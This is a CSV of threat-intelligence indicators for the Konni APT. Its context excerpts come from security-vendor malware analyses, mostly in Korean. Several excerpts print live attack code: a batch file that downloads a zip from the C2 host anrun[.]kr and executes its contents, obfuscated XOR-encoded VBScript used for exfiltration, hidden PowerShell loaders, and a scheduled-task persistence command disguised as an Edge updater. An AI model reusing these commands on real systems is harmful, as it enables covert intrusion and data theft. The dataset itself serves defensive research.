schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:e0951d90db302558a6ad924f97ba7d2f75e9b4b21fd98bdb113b673a8890b65c,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:5bb6c18362d252b4f764b1f36ffe4d910c699dcd89e1e9b95fec591789ca41ef,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 32개의 연산 항목을 문자열로 변경하면 다음과 같이 Microsoft.XMLHTTP GETAdodb.Stream개체내용을확인할수있습니다. ■'unactivate.vbs' 파일코드분석 ○'unactivate.vbs' 파일은'versioninfo.bat' 파일에의해호출되는스크립트입니다.해당 스크립트는 지정된 컴퓨터명(% COMPUTERNAME%) 과 수집된 각종 컴퓨터내부정보를조합해C2서버( anrun[.]kr) 로전송하는데사용됩니다. OnError ResumeNextRFzWb6Sh=Left(WScript.ScriptFullName,InstrRev(WScript.ScriptFullName, ""\"") - 1) cal9zs0a9i =""=zm32LT_9G1RZlG9'""CbJO1dpnUt1=CbJO1dpnUt1&Chr(7810Xor 7887):CbJO1dpnUt1=CbJO1dpnUt1&Chr(16776Xor 16865):CbJO1dpnUt1=C",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:5a94cc39cf99187cff56d9132abde2bd65502156bc887ee3603c8a58640103f1,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport mvidFmMBN2=mvidFmMBN2&Chr(29256Xor 29242):mvidFmMBN2=mvidFmMBN2&Chr(14377Xor 14405):mvidFmMBN2=mvidFmMBN2&Chr(15285Xor 15312)mvidFmMBN2=mvidFmMBN2&Chr(2288Xor 2206):mvidFmMBN2=mvidFmMBN2&Chr(2684Xor 2591)mvidFmMBN2=mvidFmMBN2&Chr(11242Xor 11141):mvidFmMBN2=mvidFmMBN2&Chr(55171Xor 55271):mvidFmMBN2=mvidFmMBN2&Chr(33833Xor 33868):mvidFmMBN2=mvidFmMBN2&Chr(14596Xor 14688):HmElL=mvidFmMBN2 pR1rSrG8kRT.setRequestHeader uNAPAT, HmElL Kb37Qal =""!)('@#7U5{]Y);""DYcicX1=DYcicX1&C",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:4d0f3f5d50a23eac22cfd574e15ed8654cbb3e74c46aa2ccd6b15c552c6a3a7e,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○사용자정보를모으기위해DIR명령을통해주요경로의디렉토리구성과파일정보,공인 아이피 주소 및 프로세스 리스트, 시스템 정보 등을 텍스트 파일(. data) 로저장합니다. 파일명 내용 cuserdown.data Downloads 경로의디렉토리구조와파일정보 cuserdocu.data documents 경로의디렉토리구조와파일정보 cuserdesk.data desktop경로의디렉토리구조와파일정보 cprog.data ProgramFiles 경로의디렉토리구조와파일정보 cprog32.data ProgramFiles (x86) 경로의디렉토리구조와파일정보 ipinfo.data 공인아이피주소 tsklt.data 실행프로세스정보 systeminfo.data OS종류, 모델, 바이오스버전등주요시스템정보[표4-7] 외부로유출시도되는파일및내용 ○ 사용자 정보 수집 명령이 진행된후약5초간시간지연이됩니다. 그다음수집된개인정보가전송될C2서버( anrun[.]kr) 를환경변",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:818ede20ce5027de52dc38cf17f26a726289f03d3e9ddda43aae75c2c94d75b2,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:9e24d15020c761ef061f5ef31f086758deca51b1d47300463866f33f8b100fe0,observation--sha256:a1d80142ccfe75707d4606a82ce6a7bcc5cc895aa3f98bfdf84edd6760bca769,file-name,unactivate.vbs,unactivate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain unactivate.vbs Unliketheother scripts, 'Unactive.vbs' isamoreextensiveone. Yet, whenitsobfuscatedcodeisunraveled, it becomesapparent that it hasthepotential for exfiltration. Thisisachievedthroughtheexecutionof aPOSTrequest, incorporating'name' and'data' fields. Figure9- Obfuscatedformof unactivate.vbs Figure10- Deobfuscatedformof unactivate.vbs 9",
1.0.0,actor--konni,artifact--sha256:ff79acc63809558dbb3f045b524fc6145cd887a54f5a92b828d856a8eb4eeb38,observation--sha256:ba0a0a96bc2c634349e9c29825af490ff357da491e7f1758bc24326bb2ae220c,file-name,unactive.vbs,unactive.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain versioninfo.bat The'versioninfo.bat' script playsapivotal roleintheoperation. It gathersdiverseinformationabout theuser'scomputer, suchasdirectorylistings, IPaddresses, runningprocesses, andsystemdetails, andthenexfiltratesthisdatawiththeassistanceof 'unactive.vbs,' whichwe'vepreviouslyanalyzed. Figure13- Attackchainendswithdataexfiltration MITREATT&CK TechniqueName TechniqueID Phishing:SpearphishingLink T1566.002CommandandScript",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:796b2e9da6a854c4d9155426e6fe592cd76bafe2941159c606c9a47a4952ebd0,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:93fba549efc19d7bdfb29010d58c9f69c22d4014bda393c2e4aedb57a85f2c06,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:3de4ee7f6c495b947620c2d7959e2163e66f97a59bebd5038f6443c887a129f9,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:67f7701eb76562252e11290738ed40fc832c257581c472068a6c1231af195369,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:59ee79efad4360522cb4a1aef47bbfe78b000fd5b17381368b2fd88e18c551b0,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:eeda8f82fc006251603d8ad35649e79ce05522c6a5c4252b6f1350a59288b945,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:39e2f24cf75a0db0b752e39a425f593fda7c6e13b6a8734413dd152c4114e04b,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:969a61d2bfd976949b29edebd032a0a746aa628b04d1835a509704dff28ac4e2,observation--sha256:1fba304000043d6a9872cd6c612b2331bbab16af6bcf4166cd2202c75214a2cc,file-name,unzip.exe,unzip.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:8c16518db25615a469cebf9d3199b43b0d0ec8ae83285b3225377b4b79b1fda9,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:073e736364ab2e7f8a188fe2b75c7b7cb0d935c5a85784d416c48b5cdb0c62a6,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-2] 정상엑셀문서가실행된화면(일부모자이크처리) ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있습니다. Genians SecurityCenter 11",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b5baacea2e23b3d6302ef9262b3ab7108616bceefcec12f554b977ad09620112,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b9f5b7a26ed55325a0263befd07aa971ca6018a92d0212d1e1142dd585a61f00,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:75655a62f1440df34484e3a711b409b49035e92504511406df27855d116866a7,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-5] 정상PDF문서가실행된화면 ○ 다음으로 공용 폴더( Public) 경로에 'update_cmd.zip' 파일을 생성하고, 그하위공용문서( Documents) 경로에압축을해제후, 'update.vbs' 스크립트를호출합니다. ○ 'update_cmd.zip' 압축파일내부에는총9개의파일이포함돼있고, [사례A] 와정확히동일한파일이포함돼있어추가설명은생략합니다. Genians SecurityCenter 17",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:f2e700baf0d781d66b6c10c330ca9ee4329decdb26df42ee80959cbd0ad8e06b,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4. 정적코드분석(StaticCodeAnalysis)4.1. ZIP압축파일에포함된VBS파일분석■'update.vbs' 파일코드분석 ○앞서기술한내용과같이[사례A] [사례B] 모두LNK파일에의해호출되는1단계스크립트 파일은 'update.vbs' 파일입니다. VBS 파일들은 코드 전체가 난독화로적용돼있습니다. tODfJ_m0BrXqF2=""(K5JXrn-&Qg~""TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(45570Xor45653):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(27840Xor27795):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(5003Xor5096):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(22966Xor22980):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(21738Xor21635):TGs8hrdXR2lk1=TGs8hrdXR2lk1&Chr(24562Xor ",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:717b6ca8f6208742949372aef64799d8695cf9c6b1458d2273fb7dfcecff8887,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:814fd3e0231675b1a8391fd11eff7e075ffa30844f390e873f6469c799ca41ed,observation--sha256:b076f3fb1597a90616b38a88e046e247653d540030fc15405d0e1b06e2ec67e6,file-name,update.vbs,update.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
